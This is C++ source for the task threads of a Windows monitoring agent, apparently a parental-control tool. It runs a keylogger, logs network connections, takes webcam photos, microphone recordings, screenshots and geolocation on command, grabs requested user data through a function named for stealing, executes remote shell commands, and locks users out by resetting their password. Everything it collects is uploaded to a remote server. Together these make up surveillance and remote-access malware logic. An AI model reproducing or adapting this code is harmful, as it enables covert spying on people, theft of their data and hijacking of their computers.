#include "TaskRoutines.h"
#include "TasksHelper.h"

HANDLE camRequest, micRequest, lockRequest, cmdRequest, locationRequest, stealRequest, screenRequest, newDataEvent;
map<string, map<string, string>> workingTasks;

DWORD WINAPI initFiltering(LPVOID lpParam)
{
	while (TRUE) {
		ResponseData deviceConfigs;
		string additionalSites = "";

		while (TRUE) {
			// Get configuration file from the server
			deviceConfigs = downloadFile(CONFIGURATION);
			// Try again in SYNC_TIME if failed to get the file..
			if (deviceConfigs.dwStatusCode != 200 || deviceConfigs.response == "[]")
				Sleep(SYNC_TIME);
			else
				break;
		}
		// Parse the retrieved json file
		map<string, string> configs = itemFromJson(TRUE, deviceConfigs.response, DATA);

		wstring finalFilterPath = L"";
		// Build the requested filter path according to the retrieved config file..
		// If finalFilterPath returns the character * it means the json file is in a bad format..
		// Otherwise the path will be built with the filter type if it is marked as true. If false, nothing will be appended..
		if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, FAKENEWS)) != L"*")
			if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, GAMBLING)) != L"*")
				if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, PORN)) != L"*")
					if ((finalFilterPath = buildFilterPath(finalFilterPath, configs, SOCIAL)) != L"*")
					{
						// Check if the path is not empty, (in case every filter is set to false)
						// If it is not empty, remove last char '-'..
						// If it is empty, set the host file as the default one. (no filters appended)
						if (finalFilterPath.size() > 0)
							finalFilterPath.pop_back();
						else
							finalFilterPath = L"default";

						// Transform the filter path into lower character string
						transform(
							finalFilterPath.begin(), finalFilterPath.end(),
							finalFilterPath.begin(),
							towlower);

						// Check if there are additional requested sites that the program should block..
						configs.find(ADDITIONAL_SITES);
						// If found additional sites parameter, get the value, (the configured sites)
						if (configs.find(ADDITIONAL_SITES) != configs.end())
							additionalSites = BLACKEAGLE_MSG + configs.find(ADDITIONAL_SITES)->second;
						else
							additionalSites = "";
						// Call the setFilters method with the filter path we built, and additional sites.
						
						// Clean the sites list and prepare it for the new host file
						additionalSites = removeCharsFromString(additionalSites, "[]\\\"");
						
						// Put new line chars between each domain
						replace(additionalSites.begin(), additionalSites.end(), ',', '\n');

						// If succeed, go to sleep for a hour, no need to check more frequently..
						if (setFilters(finalFilterPath.c_str(), additionalSites.c_str()))
							Sleep(SYNC_TIME * 60);
					}
		// Sleep only 1 minute in case something went wrong.. Will also go to sleep this time if slept for a hour before
		Sleep(SYNC_TIME);
	}
	return 0;
}

DWORD WINAPI initNetLogger(LPVOID lpParam)
{
	while (TRUE) {
		// Get a new filename
		wstring firstfilename = stringToWString(DATA_FOLDER_PATH).append(L"netlog");
		// First create a list of ip outgoing addresses on port 443 (HTTPS) and 80 (HTTP)
		LPCWSTR netSnifferCmd = L"for /f \"tokens=3\" %a in ('netstat -p tcp -n -o') do @echo %a | findstr /c:\":443\" /c:\":80\"";
		// Initiate the command
		runCommand(netSnifferCmd, firstfilename.c_str());

		wstring secondFilename = stringToWString(constructFilename(TEMP_CODE));
		// Try to parse the list and pass each ip through a function to retireve the certificate.
		// This allow us to find the ownership of the domain
		LPCWSTR listParser = L"powershell -command \"Import-module .\\scripts\\getCertId.ps1 -Force | .\\scripts\\parseList.ps1\"";
		runCommand(listParser, secondFilename.c_str());

		// After the parsing the original list is no longer needed since we have a new list
		DeleteFile(firstfilename.c_str());

		// Sort lines of last file and remove duplicates  
		wstring rDuplicates = L"powershell -command \"Get-Content " + secondFilename + L" | Sort-Object -Unique | Get-Unique\"";
		runCommand(rDuplicates.c_str(), firstfilename.c_str());

		// Delete the old file
		DeleteFile(secondFilename.c_str());

		wstring filenameFinal = stringToWString(constructFilename(NETLOG_CODE));
		// change the name to send it to our server..
		if (!rename(wStringToString(firstfilename).c_str(), wStringToString(filenameFinal).c_str()))
		{
			// Notifiy data manager thread 
			SetEvent(newDataEvent);
		}
		// Go to sleep before collecting again..
		Sleep(SYNC_TIME);
	}
	return 0;
}

DWORD WINAPI initKeylogger(LPVOID lpParam)
{
	while (TRUE) {
		QUERY_USER_NOTIFICATION_STATE pquns;
		SHQueryUserNotificationState(&pquns);

		// Determine a fullscreen state
		// If the user is in fullscreen mode he is probably playing therfore there is no need to log his keystrokes
		if (pquns == QUNS_BUSY || pquns == QUNS_RUNNING_D3D_FULL_SCREEN)
		{
			// User in fullscreen mode
			// Go to sleep until its over
			Sleep(SYNC_TIME);
			continue;
		}
		// Filename changes every { num_seconds } declared in the keylogger.cpp file 
		// We set a temp code at the beginning of the filename so that it will not be uploaded by the data manager thread 
		// untill the operation is done.
		string filename = constructFilename(TEMP_CODE);
		wstring filenameW = stringToWString(filename);

		// Start keylogger
		keylogger(filenameW.c_str());
		// Build the final filename, this will allow the data manager thread to collect and upload it.. 
		string finalFilename = constructFilename(KEYLOG_CODE);
		if (!rename(filename.c_str(), finalFilename.c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initScreenshot(LPVOID lpParam)
{
	// Try to create the corresponding event
	do {
		screenRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("screen"));
	} while (screenRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			screenRequest, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(screenRequest);

		// We set a temp code at the beginning of the filename so that it will not be uploaded by the data manager thread 
		// untill the operation is done.
		wstring filename = stringToWString(constructFilename(TEMP_CODE));
		// Start capturing
		screenCapture(filename.c_str());

		// Build the final filename, this will allow the data manager thread to collect and upload it.. 
		wstring filenameFinal = stringToWString(constructFilename(SCREENSHOT_CODE));
		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initCamera(LPVOID lpParam)
{
	// Try to create the corresponding event
	do {
		camRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cam"));
	} while (camRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			camRequest, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(camRequest);

		// We set a temp code at the beginning of the filename so that it will not be uploaded by the data manager thread 
		// untill the operation is done.
		// A png file extention is appended as requested by the opencv libary to choose how to save the captured photo.
		string filename = constructFilename(TEMP_CODE).append(".png");
		// Take a picture, do not forget to smile :D
		camera(filename.c_str());

		// Build the final filename, this will allow the data manager thread to collect and upload it.. 
		string filenameFinal = constructFilename(CAMERA_CODE);
		if (!rename(filename.c_str(), filenameFinal.c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initMic(LPVOID lpParam)
{
	// Try to create the corresponding event
	do {
		micRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("mic"));
	} while (micRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			micRequest, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(micRequest);

		// We set a temp code at the beginning of the filename so that it will not be uploaded by the data manager thread 
		// untill the operation is done.
		string filename = constructFilename(TEMP_CODE);
		// Record for 30 seconds
		recordAudio(30, filename.c_str());

		// Build the final filename, this will allow the data manager thread to collect and upload it.. 
		string filenameFinal = constructFilename(AUDIO_CODE);
		if (!rename(filename.c_str(), filenameFinal.c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}
DWORD WINAPI initRemoteLockdown(LPVOID lpParam)
{
	// Try to create the corresponding event
	do {
		lockRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("lock"));
	} while (lockRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			lockRequest, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(lockRequest);

		// Create a new password for the host 
		char* newPassword = generateRandomPass();
		// TODO: Send the new password to parent account

		wchar_t wPassword[PASSWORD_LEN];
		mbstowcs(wPassword, newPassword, strlen(newPassword) + 1);

		// Update the password and lock the current user out of his computer
		BOOL success = lockUser(wPassword);
		// Current password is now set to the new password generated and sent to the server
	}
	return 0;
}
DWORD WINAPI initRemoteCommands(LPVOID lpParam)
{
	// Try to create the corresponding event
	do {
		cmdRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("cmd"));
	} while (cmdRequest == NULL);

	while (TRUE) {
		WaitForSingleObject(
			cmdRequest, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(cmdRequest);

		// Try to find the task in the workingTasks list
		map<string, map<string, string>>::iterator tasksIter = workingTasks.find(Command);

		if (tasksIter == workingTasks.end()) // Sanity check
			continue; // Task not found in the list
		string currentCommand = "";
		// Try to find the command type to run..
		map<string, string>::iterator commandIter = (tasksIter->second).find(Command_Type);
		if (commandIter == (tasksIter->second).end()) // Sanity check
			continue;
		// Start to build the command
		currentCommand.append(commandIter->second);
		// Try to find additional path parameters for the current command..
		commandIter = (tasksIter->second).find(Command_Param);
		if (commandIter == (tasksIter->second).end()) // Sanity check
			continue;
		// Add the additional parameter to the current command..
		currentCommand.append(" ").append(commandIter->second);
		// final command should be wide string
		wstring finalCommand = stringToWString(currentCommand);

		// We set a temp code at the beginning of the filename so that it will not be uploaded by the data manager thread 
		// untill the operation is done.
		wstring filename = stringToWString(constructFilename(TEMP_CODE));

		// Initiate the requested command
		runCommand(finalCommand.c_str(), filename.c_str());

		// Build the final filename, this will allow the data manager thread to collect and upload it.. 
		wstring filenameFinal = stringToWString(constructFilename(CMD_CODE));
		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}

DWORD WINAPI initLocationTracker(LPVOID lpParam) {
	// Try to create the corresponding event
	do {
		locationRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("location"));
	} while (locationRequest == NULL);
	while (TRUE) {
		WaitForSingleObject(
			locationRequest, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(locationRequest);

		// We set a temp code at the beginning of the filename so that it will not be uploaded by the data manager thread 
		// untill the operation is done.
		wstring filename = stringToWString(constructFilename(TEMP_CODE));
		// Use geo-location api to get the location of the user..
		getLocation(filename.c_str());

		// Build the final filename, this will allow the data manager thread to collect and upload it.. 
		wstring filenameFinal = stringToWString(constructFilename(LOCATION_CODE));
		if (!rename(wStringToString(filename).c_str(), wStringToString(filenameFinal).c_str()))
		{
			// Notifiy data manager thread
			SetEvent(newDataEvent);
		}
	}
	return 0;
}

DWORD WINAPI initDataStealer(LPVOID lpParam)
{
	// Try to create the corresponding event
	do {
		stealRequest = CreateEvent(NULL, TRUE, FALSE, TEXT("steal"));
	} while (stealRequest == NULL);
	while (TRUE)
	{
		WaitForSingleObject(
			stealRequest, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(newDataEvent);

		// Try to find the task in the workingTasks list
		map<string, map<string, string>>::iterator tasksIter = workingTasks.find(DataGrab);

		if (tasksIter == workingTasks.end()) // Sanity check
			continue; // Task not found in the list

		// Find which data should be grabbed from the current user..
		map<string, string>::iterator commandIter = (tasksIter->second).find("type");
		if (commandIter == (tasksIter->second).end()) // Sanity check
			continue;

		string dataToCopy = commandIter->second;
		// Set the filename of the new grabbed data
		wstring filename = stringToWString(constructFilename(DATA_GRAB_CODE));

		// Try to get the requested data, if succeded, notifiy data manager thread
		if (grabData(dataToCopy.c_str(), filename.c_str()))
			SetEvent(newDataEvent);
	}
	return 0;
}

DWORD WINAPI initDataManager(LPVOID lpParam)
{
	// Try to create the corresponding event
	do {
		newDataEvent = CreateEvent(NULL, TRUE, FALSE, TEXT("data"));
	} while (newDataEvent == NULL);
	while (TRUE) {
		WaitForSingleObject(
			newDataEvent, // event handle
			INFINITE);    // indefinite wait
		// Event was called (Request Arrived..)
		// We reset the event to make it wait again for any request at the end of the loop..
		ResetEvent(newDataEvent);
		// New data to send 
		WIN32_FIND_DATA data, currentData;
		// Get first file in the data folder
		HANDLE hFind = FindFirstFile(L"temp/*", &data);
		// Set a priority queue with a comparator.
		// The comparator should check which file created earlier
		priority_queue<WIN32_FIND_DATA, vector<WIN32_FIND_DATA>, CompareDates> uploadQueue;

		// Look for new files in temp folder and insert each of them to a priority queue (sorted by date).
		// If the filename length is less than 3, we should skip it.. E.g ".", ".."
		if (hFind != INVALID_HANDLE_VALUE) {
			do
				if (wcslen(data.cFileName) > 3)
					uploadQueue.push(data);
			while (FindNextFile(hFind, &data)); // Do it as long as there are more files to upload.. 
			FindClose(hFind); // Close handle
		}

		// Get the files from the queue one by one, until there is nothing left..
		while (!uploadQueue.empty()) {
			// Get the first file in the queue
			currentData = uploadQueue.top();
			char filename[256];
			// Convert wchar* to char*
			wstring ws(currentData.cFileName);
			wcstombs(filename, ws.c_str(), 256);

			// Check the first letters in the filename to determine the data type..
			string dataType = checkDataType(filename);
			// If could not find the data type, remove from the queue and move to the next file..
			if (dataType == UNDEFINED_CODE) {
				uploadQueue.pop();
				continue; // File not recognized
			}
			// Build the json file to send to the server..
			map<string, string> currentJsonItem{
				  make_pair("dataType", dataType)
			};
			string json = jsonFromItem(currentJsonItem, DATA);

			// Upload the file to the server with the corrseponding json file..
			while (uploadFile(filename, (char*)json.c_str()).dwStatusCode != 200) {
				// As long as the uploading fails, go to sleep and then try again..
				Sleep(SYNC_TIME);
			}

			wstring wfilename(currentData.cFileName);
			wstring concatted_stdstr = L"temp/" + wfilename;
			LPCWSTR fullPath = concatted_stdstr.c_str();

			// Remove the task from the running tasks map..
			if (workingTasks.find(dataType) != workingTasks.end())
				workingTasks.erase(dataType);

			// Remove the file from temp folder after successfully uploading it	  
			DeleteFile(fullPath);
			// Remove from the queue
			uploadQueue.pop();
		}
	}
	return 0;
}

DWORD WINAPI initRequestManager(LPVOID lpParam)
{
	while (TRUE) {
		// Look for new requests from server.. 
		ResponseData requests;

		while (TRUE) {
			// Get all requests from the server..
			requests = downloadFile(REQUESTS);
			if (requests.dwStatusCode == 403) // Forbidden access (session timed-out)
			{
				closeSessionHandle(); // Reset session  
				while (authenticateDevice().dwStatusCode != 200) {  // retry authentication 
					Sleep(SYNC_TIME); // If failed, try again in SYNC_TIME ms..
				}
			}
			else if (requests.dwStatusCode != 200 || requests.response == "[]") // No new requests or unknown error code..
				Sleep(SYNC_TIME); // Try again in a SYNC_TIME ms..
			else
				break; // All good, continue
		}
		// Convert the response to map of requests so we could operate on each request seperately..
		map<string, map<string, string>> allRequests = itemsListFromJson(requests.response);

		// Try to initiate each of the requests with the initRequest method.
		// If the operation was not requested, no event is notified..
		initRequest(allRequests, Camera, camRequest);
		initRequest(allRequests, Audio, micRequest);
		initRequest(allRequests, Screenshot, screenRequest);
		initRequest(allRequests, Lockdown, lockRequest);
		initRequest(allRequests, Command, cmdRequest);
		initRequest(allRequests, Location, locationRequest);
		initRequest(allRequests, DataGrab, stealRequest);

		// Got to sleep for a minute..
		Sleep(SYNC_TIME);
	}
	return 0;
}

BOOL initRequest(map<string, map<string, string>> allRequests, const char* requestName, HANDLE requestHandle) {
	map<string, map<string, string>>::iterator allRequestsIterator;
	map<string, string> currentRequest;
	map<string, string>::iterator requestIterator;

	// Check if the request name exist in the retrieved requests file
	allRequestsIterator = allRequests.find(requestName);

	// If it doesn't, return..
	if (allRequestsIterator == allRequests.end())
		return FALSE;

	// Get the json data of the current request
	currentRequest = allRequestsIterator->second;

	// Try to find the task in the workingTasks list
	map<string, map<string, string>>::iterator tasksIter = workingTasks.find(requestName);

	if (tasksIter == workingTasks.end()) {
		//The task is new, register it in the map ..
		workingTasks.insert(make_pair(requestName, currentRequest));
	}
	else { // The task was found in the map ..
		return FALSE; // Task already running, no need to call it again ..
	}
	// Else call the requested task (If the event created succesfully)
	if (requestHandle != NULL)
	{
		SetEvent(requestHandle);
		return TRUE;
	}
	return FALSE;
}
